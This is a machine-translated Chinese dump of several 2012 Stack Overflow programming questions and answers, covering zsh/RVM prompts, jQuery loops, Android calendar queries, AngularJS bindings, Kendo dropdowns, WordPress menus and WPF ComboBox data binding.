> 标签：shell, rvm, zsh

我想让 Zsh 显示当前的 RVM Ruby 和 gemset，例如：

```
$ [ ethan@devlaptop ~/ ruby-1.9.3-p194@some_gemset ] 
```

我已经安装了 oh-my-zsh 并且我已经`~/.rvmrc`像这样激活了 RVM 插件：

```
plugins=(git ruby rails3 rvm cap) 
```

我检查了 RVM 是否按照文档中的建议工作：

```
type rvm | head -n 1
rvm is a shell function 
```

在主题文件中，我的提示设置如下：

```
PROMPT='%{$fg[white]%}[ %n@%m%{$fg[cyan]%} %2c %{$reset_color%}${rvm-prompt} %{$fg[white]%}] %{$reset_color%}' 
```

但是提示结果是这样的：

```
[ ethan@devlaptop ~ prompt ] 
```

当我直接`rvm-prompt`在命令行上运行时，它按预期工作。

知道我需要解决什么吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-29T22:35:37.577

这是一个语法错误。我需要`$(rvm-prompt)`而不是`${rvm-prompt}`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T07:50:38.567

这听起来像一个错误。错误应该报告给开发人员，而不是 SO

[https://github.com/wayneeseguin/rvm/issues/new](https://github.com/wayneeseguin/rvm/issues/new)

# c++ - C++ 程序的 Web 界面

> ID：12648062
> 
> 赞同：4
> 
> 时间：2012-09-28T22:15:37.050
> 
> 标签：c++

我正在为我的学习结束开发一个项目。这个项目基本上是一个服务器，是跨平台的，是用 C++ 开发的。

我想知道是否有可能制作一个可以使用的 Web 界面，例如`listener`设计模式来记录程序所做的事情。这将是跨平台的，并且是理想的，因为该程序应该在远程服务器上运行。

我的问题是：是否有任何网络技术可以让我在程序记录某些内容时实时更新我的​​网页。我知道这很不寻常，而且我不是网络技术专家，这就是我问的原因。

Erlang 会这样做吗？

谢谢你的帮助

**编辑：**举一个更具体的例子，我希望能够实时跟踪我的程序的执行，并看到我的程序的日志出现在页面上。这个想法是使用一个网页，例如我在 Windows 上使用 WPF 或在 Linux 上使用 GTK。就像有人说的那样，对于我的应用程序来说，这将是某种监视器。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-28T22:23:31.913

这比你想象的要容易得多。Web 服务器基本上以路径名的形式获取请求，并返回一个页面。如果设置正确，它将调用程序来创建内容。这称为“CGI”。

如果您可以在不进行实时更新的情况下做到这一点，那将非常简单：只需刷新页面，您的程序就可以再次被调用。

如果你想要实时更新，你需要做更多的事情。最简单的方法是使用一点轻量级的 javascript。这里的神奇词是 AJAX。这两个网上都有很多教程，只是谷歌。

最主要的是从一个非常简单的示例开始并添加到它。特别是 Javascript 有点奇怪。但是，请按照教程进行操作，您会得到它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T22:41:33.930

您可以嵌入一个 Web 服务器，例如[http://code.google.com/p/mongoose](http://code.google.com/p/mongoose)并使用 xhr 或更好地使用 websockets 来轮询它。

或者使用 Nagios 等监控解决方案（Nagios Core 是免费的）。

# jquery - 如何限制 jquery 中 json 数据的每个循环？

> ID：12648063
> 
> 赞同：9
> 
> 时间：2012-09-28T22:15:36.360
> 
> 标签：jquery, json, each

有没有一种很好的方法可以使用 jquery 每个循环仅循环 json 对象的前 3 项？

我正在考虑等效于[.slice(start,end)](http://api.jquery.com/slice/)函数。

```
var data = [ 
 {"Id": 10004, "PageName": "club"}, 
 {"Id": 10040, "PageName": "qaz"}, 
 {"Id": 10059, "PageName": "ee"}, 
 {"Id": 10089, "PageName": "dd"}, 
 {"Id": 10095, "PageName": "hh"}
];

$.each(data, function(i, item) {
    alert(item.PageName);
    // somehow break at item 3
});​ 
```

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-09-28T22:20:40.390

```
var data = [ 
 {"Id": 10004, "PageName": "club"}, 
 {"Id": 10040, "PageName": "qaz"}, 
 {"Id": 10059, "PageName": "ee"}, 
 {"Id": 10089, "PageName": "dd"}, 
 {"Id": 10095, "PageName": "hh"}
];

$.each(data, function(i, item) {
    alert(item.PageName);
    return i<2;
});​ 
```

当您返回 false 时，每个都停止。

从文档：

> 通过使回调函数返回 false，我们可以在特定迭代中打破 $.each() 循环。返回非 false 与 for 循环中的 continue 语句相同；它将立即跳到下一次迭代。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-09-28T22:19:02.910

尝试这个

```
$.each(data.slice(0,3), function(i, item) {
    alert(item.PageName);
});​ 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-28T22:18:13.460

你可以试试这个

```
$.each(data, function(i, item) {
    if(i>2) return false;
    alert(item.PageName);
});​ 
```

[**演示**](http://jsfiddle.net/erdjw/1/)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T22:31:02.673

```
$.each($(data).slice(0,3), function(i,item){
  console.log("\t",item.Id);
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-28T22:40:08.790

您也可以尝试使用 for 循环遍历它

这是怎么做的

```
 for(var i =0;i<3;i++){

       alert("Id is"+d[i].id) ;

     } 
```

并遍历整个 Json 数组使用以下

```
 for(var i =0;i<d.length;i++){

         alert("Id is"+d[i].id);
     } 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-09-28T22:24:58.153

```
$.each(data, function(i){
  //i is 0 based, so 3 is really 2.
  if(i == 2){
      //exit the loop on the 3rd iteration of the object.
      return false;
  }
}); 
```

# android - 如何从android资源中获取一组xml文件？

> ID：12648065
> 
> 赞同：1
> 
> 时间：2012-09-28T22:15:40.527
> 
> 标签：android, xml, resources, android-resources

我将这个数组放入我的资源文件中：

```
<array name="xml_data">
    <item>@xml/data1</item>
    <item>@xml/data2</item>
    <item>@xml/data3</item>
    <item>@xml/data4</item>
</array> 
```

通常，它与普通数组没有什么不同，但是当进入代码时，这不起作用......

```
final Resources res = getResources();
int[] xmlList = res.getIntArray(R.array.xml_data);
Log.i(TAG, "Data found: "+ xmlList.length);
for (int i = 0; i < xmlList.length; i++) {
    Log.i(TAG, "Extract xml id="+ xmlList[i].);
} 
```

这是在 logcat 中获得的输出：

```
Data found: 4
Extract xml id=0
Extract xml id=0
Extract xml id=0
Extract xml id=0 
```

你能帮我解决这个问题吗？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-31T00:19:32.827

像这样使用你的 TypedArray：

`TypedArray mTypedArray = getResources().getTypedArray(R.array.xml_data);`

然后，检索您的资源 ID，如下所示：

`int id = mTypedArray.getResourceId(position, defaultResourceId);`

当我使用它时，它是一个字符串 ID 数组，所以我跟着它：

`getString(id)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-17T12:57:52.723

为方便起见，举个例子：

我在示例 xml 文件中有一个简单的“字符串”数组（不是 int）。让我们称之为array.xml

```
<?xml version="1.0" encoding="utf-8"?>  
<resources>
<string-array name="doing">
    <item>1</item>
    <item>2/item>
    <item>3/item>
    <item>3</item>
</string-array>
</resources> 
```

现在在我的 Java 文件中，我在 OnCreate() 函数中按如下方式调用它并且它起作用了：

```
String[] xmlList = getResources().getStringArray(R.array.doing);
int first = Integer.parseInt(xmlList[0]);
Log.d("test", "1st string is: " + first); 
```

PS：我没有测试过代码，但我希望你明白逻辑。一切顺利。希望能帮助到你。

# android - 日历事件查询的选择

> ID：12648066
> 
> 赞同：3
> 
> 时间：2012-09-28T22:15:43.717
> 
> 标签：android, calendar

我尝试从特定日历中读出事件。以下是我尝试使用的代码。但我不知道选择的外观如何。我想使用日历 ID 进行选择。如果没有选择（空），它会读出所有日历，但我只想要一个。查询如下所示：

```
public final Cursor query (Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) 
```

selection：
声明要返回哪些行的过滤器，格式化为 SQL WHERE 子句（不包括 WHERE 本身）。传递 null 将返回给定 URI 的所有行。

此代码是第一次尝试选择：

```
 Uri.Builder builder = Instances.CONTENT_URI.buildUpon();
            ContentUris.appendId(builder, now - DateUtils.DAY_IN_MILLIS);
            ContentUris.appendId(builder, now + DateUtils.DAY_IN_MILLIS);

            Cursor mCursor = null;
            final String[] projection = new String[]
            { CalendarContract.Events.TITLE, CalendarContract.Events.DTSTART, CalendarContract.Events.DTEND};

            mCursor = getContentResolver().query(
                builder.build(), projection, Instances._ID  + calendarID, null, null);
                mCursor.moveToFirst(); 
```

那就是上面代码的错误：

```
09-29 00:07:41.800: E/AndroidRuntime(14507): FATAL EXCEPTION: TweetCollectorTimer
09-29 00:07:41.800: E/AndroidRuntime(14507): android.database.sqlite.SQLiteException: no such column: _id3: , while compiling: SELECT title, dtstart, dtend FROM Instances INNER JOIN view_events AS Events ON (Instances.event_id=Events._id) WHERE (begin<=? AND end>=?) AND (_id3)
09-29 00:07:41.800: E/AndroidRuntime(14507):    at android.database.DatabaseUtils.readExceptionFromParcel(DatabaseUtils.java:179)
09-29 00:07:41.800: E/AndroidRuntime(14507):    at android.database.DatabaseUtils.readExceptionFromParcel(DatabaseUtils.java:135)
09-29 00:07:41.800: E/AndroidRuntime(14507):    at android.content.ContentProviderProxy.query(ContentProviderNative.java:358)
09-29 00:07:41.800: E/AndroidRuntime(14507):    at android.content.ContentResolver.query(ContentResolver.java:311)
09-29 00:07:41.800: E/AndroidRuntime(14507):    at de.ring.AppService$1.run(AppService.java:96)
09-29 00:07:41.800: E/AndroidRuntime(14507):    at java.util.Timer$TimerImpl.run(Timer.java:284) 
```

**编辑：**

非常感谢，我改成：

```
 mCursor =   getContentResolver().query(
                    builder.build(), projection, Instances.CALENDAR_ID  + " = ?",
                    new String[]{""+calendarID}, null); 
```

使用 CALENDAR_ID 而不仅仅是 _ID 很重要。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T08:34:46.997

做这个

```
 getContentResolver().query(
                    builder.build(), projection, Instances._ID  + "=?",
new String[]{""+calendarID}, null); 
```

而不是这个

```
getContentResolver().query(
                builder.build(), projection,
 Instances._ID  + calendarID, null, null); 
```

由于第三个参数采用选择字符串，并且您将其传递给`Instances._ID + calendarID`它，因此它将被评估为

```
SELECT ........ WHERE _id3; 
```

它将日历 ID 的编号附加到列名。

# objective-c - 在（xcode）WebView 内的 textarea 中写入会导致视图被向上推

> ID：12648068
> 
> 赞同：0
> 
> 时间：2012-09-28T22:15:57.410
> 
> 标签：objective-c, ios, xcode, cocoa-touch, html

这是场景。我正在为 ipad 开发一个应用程序。这个应用程序，只是一个网站的容器。我创建了一个 webview，它调用了一个具有 textarea 的网站。

如果我在此文本区域内单击并显示软键盘，则视图被向上推超过键盘的大小。我通过使用 UIKeyboardWillShowNotification 通知再次放下视图来解决此问题。

但是检查一下。如果我在文本区域内书写，视图会再次向上推，即使只有一个字母。

以下是一些截图：

这是在写东西之前

![这是在写东西之前](../Images/99bd83430bee490337703ed4c67ce7ee.png)

这是在写东西之后

![这是在写东西之后](../Images/64fe61607aa03f03c665459f994ce16e.png)

有人有同样的问题吗？或者任何关于正在发生的事情的线索？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-02T14:33:21.397

好的，我想通了。这是我的错，原因是主视图是一个TableView。更改为简单的视图，现在一切都很完美

# javascript - 共享目标多个图像 Windows 8

> ID：12648069
> 
> 赞同：0
> 
> 时间：2012-09-28T22:15:57.353
> 
> 标签：javascript, c#-4.0, microsoft-metro, winjs

我已经实施了共享目标合同以共享多张照片；我可以使用 folderRelativeID 获取共享图像列表，但我需要获取文件的完整路径，以便我可以与我的程序共享它。

可以这样做吗？

我正在使用 HTML/Javascript 和 c#，所以知道任一位置的完整路径对我来说都很好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-09T17:44:58.187

如果图像是您的项目文件夹，请使用：

```
<img id="mainImg2" src="ms-appdata:///Local//bckgrnd.jpg" /> 
```

# quartz-scheduler - 使用 Quartz.Net，我如何找出触发器触发了多少次

> ID：12648074
> 
> 赞同：1
> 
> 时间：2012-09-28T22:17:00.137
> 
> 标签：quartz-scheduler, quartz.net

我将 ADOJobStore 与我的调度程序一起使用，在数据库中我可以看到指示我的触发器触发了多少次的列。有没有办法以编程方式检索该数据？我似乎无法在触发器上找到它作为属性。

```
var triggers = _scheduler.GetTriggersOfJob(jobDetails.Key); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T07:04:00.747

如果触发器支持，您可以获得此信息。以下触发器具有**TimesTriggered**属性：

*   IDailyTimeIntervalTrigger
*   ICalendarIntervalTrigger
*   简单触发器

这也可以反转为：ICronTrigger 不支持这个，所以 ITrigger 接口没有信息。

所以你需要将触发器强制转换为上述一些类型来获取信息。

# android - 向 OverlayItem 添加字段

> ID：12648080
> 
> 赞同：0
> 
> 时间：2012-09-28T22:18:07.377
> 
> 标签：android, overlayitem

关于 OverlayItem 的一个简单问题。我的地图 android 应用程序，点击一个位置，我会显示一些信息，如：名称、infoq、info2、info3。所以我扩展了 OverlayItems：

```
public class NewOverlayItem extends OverlayItem {

    public NewOverlayItem(GeoPoint point, String title, String snippet1, String snippet2, String snippet3) {
        super(point, title, snippet1);

    }

} 
```

我用它：

```
NewOverlayItem overlayitem = new NewOverlayItem(geo, name, oferta, horario, info); 
```

现在我不知道如何使用 itemizedOverlay.addOverlay(overlayitem); 为了显示新闻片段。

我已经更改了定义类：

```
 public class MyOverlay extends ItemizedOverlay<MyOverlayItem> { 

...} 
```

但地图仍然只显示第一个被剪断的。

提前发送。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T22:25:21.787

好吧，您可以将其扩展到*store* `info2`和`info3`. 您将不得不安排显示数据。

只要确保您`ItemizedOverlay`使用相同的类型。因此，如果您扩展`OverlayItem`到 create `DoxsiOverlayItem`，您的`ItemizedOverlay`声明将使用`ItemizedOverlay<DoxsiOverlayItem>`而不是`ItemizedOverlay<OverlayItem>`.

# javascript - 尝试使用 angularjs 将一个输入的值更新为另一个

> ID：12648085
> 
> 赞同：1
> 
> 时间：2012-09-28T22:18:41.867
> 
> 标签：javascript, angularjs

我是使用 AngularJS 的新手，但我一直在使用一个宠物项目，但我遇到了一个问题。我基本上想要做的是从此输入字段中获取文本输入：

```
<form id="ci_search_form">
    <p class="input-append"><label>Search:</label> <input type="text" id="query" ng:model="query" autofocus> <button ng:click="clearSearch()" class="btn"><i class="icon-remove"></i></button></p>
</form> 
```

并使用该值更新此输入字段的值：

```
<div><input type="text" id="ciquery" ng:model="ciquery.Name"></div> 
```

第二个输入过滤了一些数据，我可以直接输入它并且它可以工作。但是，此页面将有不同的数据集，每个数据集都有自己的搜索输入，我希望通过顶部的主输入进行更新。我也无法设置 value="" 或使用 jQuery 设置值，除非我明确输入第二个输入字段，否则它只会显示为空白。任何人都可以提供解决方案吗？

**编辑**

我想我应该包括我的应用程序和控制器代码：

```
var App = angular.module('TicketAssistApp', []);

App.controller('SearchController', function($scope, $http, $filter){
    $scope.query = '';

    $http.get('static/ci_list.json').success(function(data){
        $scope.ci_list = data;
    });

    $scope.clearSearch = function(){
        $scope.query = '';
    }
}); 
```

**编辑 2**

取得了一些进展。在 $scope 中创建了一个可以称为更新 ciquery 的函数：

```
var App = angular.module('TicketAssistApp', []);

App.controller('SearchController', function($scope, $http, $filter){
    $scope.query = '';
    $scope.ciquery = '';

    $http.get('static/ci_list.json').success(function(data){
        $scope.ci_list = data;
    });

    $scope.queryUpdate = function(){
        $scope.ciquery = $scope.query;
    }

    $scope.clearSearch = function(){
        $scope.query = '';
        $scope.queryUpdate();
    }
}); 
```

这很好用。但是，这会产生另一个问题。在 ciquery 之前，我使用 ciquery.Name 仅过滤 Name 属性。使用这个新解决方案，我不得不将其更改为：

```
<div><input type="hidden" id="ciquery" ng:model="ciquery"></div> 
```

这会搜索我的数据中返回不需要的结果的所有字段。建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-02T14:02:57.790

$scope 和 ng-model 是不同的。您应该将 ng-model 的属性赋予 ng-click 的功能。看这个 -> [Ng-model 不更新控制器值](https://stackoverflow.com/questions/12618342/ng-model-does-not-update-controller-value?answertab=votes#tab-top)

更新第二个输入的字段（这里是一个例子-> [http://jsfiddle.net/yEvSL/1/](http://jsfiddle.net/yEvSL/1/)）

```
<div><input type="text" id="ciquery" ng:model="query"></div> 
```

# api - 从选择框中分配变量

> ID：12648087
> 
> 赞同：0
> 
> 时间：2012-09-28T22:18:58.953
> 
> 标签：api, user-interface, service, web, kendo-ui

我整天都在尝试“捕获”或分配/绑定到所选状态，并将其分配给一个名为“文本”的变量，以便我可以在另一个 API 调用中使用它来调用另一个下拉框“产品”。
我想我一定只是错过了一些东西，并希望能得到一点帮助。谢谢。

```
<html dir="ltr" lang="en-US">
   <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
      <title>Legis Connect</title>
      <script  type="text/javascript" src="js/jquery-1.7.2.min.js"></script>
      <link rel="stylesheet" href="css/kendo.common.min.css">
      <link rel="stylesheet" href="css/kendo.black.min.css">
  <link rel="stylesheet" href="css/kendo.mobile.all.min.css">
        <link rel="stylesheet" href="css/kendo.dataviz.min.css">
      <script src="js/kendo.all.min.js"></script>
   </head>
   <body>
            <div class="k-widget k-header">
                     <span class="infoHead">Information</span>
                     <p>
<input id="state" placeholder="Select State..." />
</p>
<p>
         <input id="products"/>
         </p>
            <script>

      $(document).ready(function() {
                    $("#state").kendoDropDownList({
                   //     optionLabel: "Select State...",
                        dataTextField: "name",
                        dataValueField: "abbreviation",
                        dataSource: {
                         transport: {
                              read: {
                                url: "http://openstates.org/api/v1/metadata/?apikey=????????",
                                dataType: "jsonp"
                              }
                            }
                        }

                    });
                        //  change: function(test){
                    //  var text = this.value()
            var states=$("#state").data("kendoDropDownList");
states.bind("change", function(e) {
    var text = (this.value())
                    alert (text)
});

          $("#products").kendoDropDownList({
                      optionLabel: "Select product...",
                        dataTextField: "legislature_name",
                        dataValueField: "legislature_name",
                        dataSource: {
                            transport: {
                              read: {
                                url: "http://openstates.org/api/v1/metadata/"+text+"/?apikey=???????????????????",
                                dataType: "jsonp"
                              }
                            }
                            }

                      })
                      $("#products").data("kendoDropDownList");
      });

            </script>

        </div>
   </body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-13T03:48:22.480

It appears that you're trying to create cascading dropdowns; when you choose a value in the states dropdown list, it loads the products available for the selected state. There's a helpful article from Telerik on how to do that with the combo box controls (works the same from dropdown lists): [http://docs.kendoui.com/getting-started/web/combobox/cascading](http://docs.kendoui.com/getting-started/web/combobox/cascading). There's actually a property called `cascadeFrom` which you can set on the products dropdown list to tell it to cascade from the states dropdown list. Hope that helps!

# jquery - WordPress 类别菜单 jQuery/CSS 悬停

> ID：12648092
> 
> 赞同：0
> 
> 时间：2012-09-28T22:19:17.653
> 
> 标签：jquery, html, css, wordpress

我正在尝试为运行 WordPress 的博客使用下拉菜单；我想做的是为我的类别设置子菜单。所以它应该看起来像这样：[http](http://d.pr/i/jj0I) ://d.pr/i/jj0I - 确实如此.. 但它在页面加载时也看起来像这样 - 这不是我想要的。一般来说，如果我不使用 WordPress，这将是一个简单的解决方案，因为我可以将以下内容添加到我的 HTML 中。

**没有 WordPress 的 HTML 菜单：**

```
<ul class="dropdown">
    <li>Link 1</li>
    <li>Link 2</li>
    <li>
        <ul style="visibility: hidden;">
            <li>Sub menu - Link 1</li>
            <li>Sub menu - Link 2</li>
        </ul>
    </li>
    <li>Link 4</li>
</ul> 
```

**带有 WordPress 的 HTML 菜单**

```
<ul class="dropdown" style="visibility: hidden;">
    <?php wp_list_categories('title_li='); ?>
</ul> 
```

我想要用 WordPress 做的是能够在我的子菜单上使用***'style="visibility: hidden;"' 。***如果我重写 wp_list_categories 是可能的，但我需要通过主题检查，所以我不能这样做。因此，如果在页面加载时不使用***'style="visibility: hidden;"'***，子菜单会自动显示而无需悬停。

**我的 jQuery：**

jQuery（文档）.ready（函数（$）{

```
jQuery("ul.dropdown li").hover(function() {
    $('ul:first',this).css('visibility', 'visible');
}, function() {
    jQuery(this).removeClass("hover");
    jQuery('ul:first',this).css('visibility', 'hidden');
    });
}); 
```

***如果有帮助，您可以在以下位置实时查看下拉菜单：[http ://wpvault.com/kahlam-test/](http://wpvault.com/kahlam-test/)***

如果我遗漏了任何内容，我很抱歉，如果我有我会尽我所能快速添加它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:22:44.817

```
.dropdown .children{
    visibility:hidden;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T22:24:37.740

在页面加载时隐藏你的 ul..

```
$(function() {
   $('ul.dropdown li > ul').hide();
   // Your Code here
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T22:23:00.090

为什么不使用菜单创建屏幕并以这种方式创建菜单？

您可以使用 WP 菜单创建器创建分层菜单，并且 html 应该与您要查找的内容大致相同。

# c# - WPF 组合框未正确更新

> ID：12648095
> 
> 赞同：0
> 
> 时间：2012-09-28T22:19:41.463
> 
> 标签：c#, wpf, data-binding, combobox

`SelecteItem`我正在尝试在其属性上使用带有数据绑定的 WPF 组合框。当用户选择一个新的选择时，会`SelectedItem`发生变化，但我的模型没有正确更新，并且`SelectionBoxItem`（组合框中显示的项目）没有改变。

更具体地说，我有以下两个元素：

```
<ListView Name="lvNodes" ItemsSource="{Binding Path=Nodes}" SelectedItem="{Binding Path=CurrentNode, Mode=TwoWay}">
                    <ListView.ItemTemplate>
                        <DataTemplate>
                            <StackPanel Orientation="Horizontal">
                                <TextBlock Text="{Binding Path=Name}"/>
                            </StackPanel>
                        </DataTemplate>
                    </ListView.ItemTemplate>
                </ListView> 
```

此列表视图按预期工作。有问题的组合框是这样定义的

```
<ComboBox ItemsSource="{Binding Path=CameraViews}" SelectedItem="{Binding Path=CurrentNode.NodeInfo.Camera1, Converter={StaticResource EnsureBlank}, Mode=TwoWay}" Name="comboBoxTopCam" SelectionChanged="comboBoxTopCam_SelectionChanged">
                                <ComboBox.ItemTemplate>
                                    <DataTemplate>
                                        <TextBlock Text="{Binding Path=Name}"/>
                                    </DataTemplate>
                                </ComboBox.ItemTemplate>
                            </ComboBox> 
```

因此，当用户从 ListView（上图）中选择一个节点时，ComboBox 会更新以显示该节点正在使用的相机。

现在奇怪的行为。如果用户单击组合框上的新项目，我可以停止调试器并检查该`SelecteItem`属性。这总是被正确设置，但是`CurrentNode.NodeInfo.Camera1`属性没有改变，并且“SelectionBox”中显示的字符串没有改变。

然而，它变得更加陌生。如果用户在 ComboBox 上进行此类选择之后切换节点（使用前面定义的 ListView），则 ComboBox 再次不会显示新值，但这`SelectedItem`是正确的。如果用户随后再次更改 ListView 中的选定项目，则它开始显示正确的值，并且在用户再次弄乱组合框之前很好。

现在我之前说过，当 ComboBox 更改时，我的模型不会更新，所以我制作了一个事件处理程序来为我更新模型（您可以在 ComboBox 的定义中看到这一点）。这被定义为可能

```
private void comboBoxTopCam_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        CameraViewInfo selCam = comboBoxTopCam.SelectedItem as CameraViewInfo;
        if (selCam != null)
        {
            OTNode selNode = lvNodes.SelectedItem as OTNode;

            if (selCam.Name == "None")
                selNode.NodeInfo.Camera1 = new CameraViewInfo();
            else
                selNode.NodeInfo.Camera1 = selCam; // <- This line affects the behavior
        }
    } 
```

当我注释掉上面列表中的标记行时，ComboBox 会在 SelectionBox 中显示正确的项目，但不会更新我的模型（例如`CurrentNode.NodeInfo.Camera1`未更改）。当我使用`lvNodes.SelectedItem`OR 时会发生这种情况`CurrentCamera`（数据绑定属性），这没有区别。

我知道这是一个非常奇怪的问题，我尽我所能解释它，如果有人想要更多信息（数据绑定的调试输出、转换器的代码、关于相等运算符的信息等）我很乐意提供它，我会如有必要，活动愿意上传显示奇怪行为的视频，因为仅从文本中很难理解。

更新：

### 转换器代码

```
public class EnsureBlankConterter : IValueConverter
{
    public object Convert(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
    {
        if (value is CameraViewInfo)
        {
            if ((value as CameraViewInfo).Name == "")
            {
                return new CameraViewInfo()
                {
                    Name = "None"
                };
            }
        }

        return value;
    }

    public object ConvertBack(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
    {
        if (value is CameraViewInfo)
        {
            if ((value as CameraViewInfo).Name == "None")
            {
                return new CameraViewInfo();
            }
        }

        return value;
    }
} 
```

### 调试输出使用`PresentationTraceSource.High`

加载时：

```
System.Windows.Data Warning: 54 : Created BindingExpression (hash=45045097) for Binding (hash=10919470)
System.Windows.Data Warning: 56 :   Path: 'CurrentNode.NodeInfo.Camera1'
System.Windows.Data Warning: 60 : BindingExpression (hash=45045097): Attach to System.Windows.Controls.ComboBox.SelectedItem (hash=34909671)
System.Windows.Data Warning: 65 : BindingExpression (hash=45045097): Resolving source 
System.Windows.Data Warning: 68 : BindingExpression (hash=45045097): Found data context element: ComboBox (hash=34909671) (OK)
System.Windows.Data Warning: 76 : BindingExpression (hash=45045097): Activate with root item ConfigurationWindow (hash=22010384)
System.Windows.Data Warning: 105 : BindingExpression (hash=45045097):   At level 0 using cached accessor for ConfigurationWindow.CurrentNode: RuntimePropertyInfo(CurrentNode)
System.Windows.Data Warning: 102 : BindingExpression (hash=45045097): Replace item at level 0 with ConfigurationWindow (hash=22010384), using accessor RuntimePropertyInfo(CurrentNode)
System.Windows.Data Warning: 99 : BindingExpression (hash=45045097): GetValue at level 0 from ConfigurationWindow (hash=22010384) using RuntimePropertyInfo(CurrentNode): <null>
System.Windows.Data Warning: 104 : BindingExpression (hash=45045097):   Item at level 1 is null - no accessor
System.Windows.Data Warning: 101 : BindingExpression (hash=45045097): Replace item at level 2 with {NullDataItem}
System.Windows.Data Warning: 78 : BindingExpression (hash=45045097): TransferValue - got raw value {DependencyProperty.UnsetValue}
System.Windows.Data Warning: 86 : BindingExpression (hash=45045097): TransferValue - using fallback/default value <null>
System.Windows.Data Warning: 87 : BindingExpression (hash=45045097): TransferValue - using final value <null>
System.Windows.Data Warning: 99 : BindingExpression (hash=45045097): GetValue at level 0 from ConfigurationWindow (hash=22010384) using RuntimePropertyInfo(CurrentNode): OTNode (hash=59090892)
System.Windows.Data Warning: 99 : BindingExpression (hash=45045097): GetValue at level 0 from ConfigurationWindow (hash=22010384) using RuntimePropertyInfo(CurrentNode): OTNode (hash=59090892)
System.Windows.Data Warning: 106 : BindingExpression (hash=45045097):   At level 1 - for OTNode.NodeInfo found accessor ReflectPropertyDescriptor(NodeInfo)
System.Windows.Data Warning: 102 : BindingExpression (hash=45045097): Replace item at level 1 with OTNode (hash=59090892), using accessor ReflectPropertyDescriptor(NodeInfo)
System.Windows.Data Warning: 99 : BindingExpression (hash=45045097): GetValue at level 1 from OTNode (hash=59090892) using ReflectPropertyDescriptor(NodeInfo): OTNodeInfo (hash=34742292)
System.Windows.Data Warning: 106 : BindingExpression (hash=45045097):   At level 2 - for OTNodeInfo.Camera1 found accessor ReflectPropertyDescriptor(Camera1)
System.Windows.Data Warning: 102 : BindingExpression (hash=45045097): Replace item at level 2 with OTNodeInfo (hash=34742292), using accessor ReflectPropertyDescriptor(Camera1)
System.Windows.Data Warning: 99 : BindingExpression (hash=45045097): GetValue at level 2 from OTNodeInfo (hash=34742292) using ReflectPropertyDescriptor(Camera1): CameraViewInfo (hash=29245900)
System.Windows.Data Warning: 78 : BindingExpression (hash=45045097): TransferValue - got raw value CameraViewInfo (hash=29245900)
System.Windows.Data Warning: 80 : BindingExpression (hash=45045097): TransferValue - user's converter produced CameraViewInfo (hash=29245900)
System.Windows.Data Warning: 87 : BindingExpression (hash=45045097): TransferValue - using final value CameraViewInfo (hash=29245900) 
```

在选择框中未显示的组合框上进行选择后：

```
System.Windows.Data Warning: 88 : BindingExpression (hash=45045097): Update - got raw value CameraViewInfo (hash=7936647)
System.Windows.Data Warning: 90 : BindingExpression (hash=45045097): Update - user's converter produced CameraViewInfo (hash=7936647)
System.Windows.Data Warning: 92 : BindingExpression (hash=45045097): Update - using final value CameraViewInfo (hash=7936647)
System.Windows.Data Warning: 99 : BindingExpression (hash=45045097): GetValue at level 0 from ConfigurationWindow (hash=22010384) using RuntimePropertyInfo(CurrentNode): OTNode (hash=59090892)
System.Windows.Data Warning: 99 : BindingExpression (hash=45045097): GetValue at level 1 from OTNode (hash=59090892) using ReflectPropertyDescriptor(NodeInfo): OTNodeInfo (hash=22129877) 
```

将 ListView 切换到新节点，Selection Box 仍然没有更新：

```
System.Windows.Data Warning: 99 : BindingExpression (hash=45045097): GetValue at level 0 from ConfigurationWindow (hash=22010384) using RuntimePropertyInfo(CurrentNode): OTNode (hash=63206919)
System.Windows.Data Warning: 99 : BindingExpression (hash=45045097): GetValue at level 0 from ConfigurationWindow (hash=22010384) using RuntimePropertyInfo(CurrentNode): OTNode (hash=63206919)
System.Windows.Data Warning: 106 : BindingExpression (hash=45045097):   At level 1 - for OTNode.NodeInfo found accessor ReflectPropertyDescriptor(NodeInfo)
System.Windows.Data Warning: 102 : BindingExpression (hash=45045097): Replace item at level 1 with OTNode (hash=63206919), using accessor ReflectPropertyDescriptor(NodeInfo)
System.Windows.Data Warning: 99 : BindingExpression (hash=45045097): GetValue at level 1 from OTNode (hash=63206919) using ReflectPropertyDescriptor(NodeInfo): OTNodeInfo (hash=35582358)
System.Windows.Data Warning: 106 : BindingExpression (hash=45045097):   At level 2 - for OTNodeInfo.Camera1 found accessor ReflectPropertyDescriptor(Camera1)
System.Windows.Data Warning: 102 : BindingExpression (hash=45045097): Replace item at level 2 with OTNodeInfo (hash=35582358), using accessor ReflectPropertyDescriptor(Camera1)
System.Windows.Data Warning: 99 : BindingExpression (hash=45045097): GetValue at level 2 from OTNodeInfo (hash=35582358) using ReflectPropertyDescriptor(Camera1): CameraViewInfo (hash=49590542)
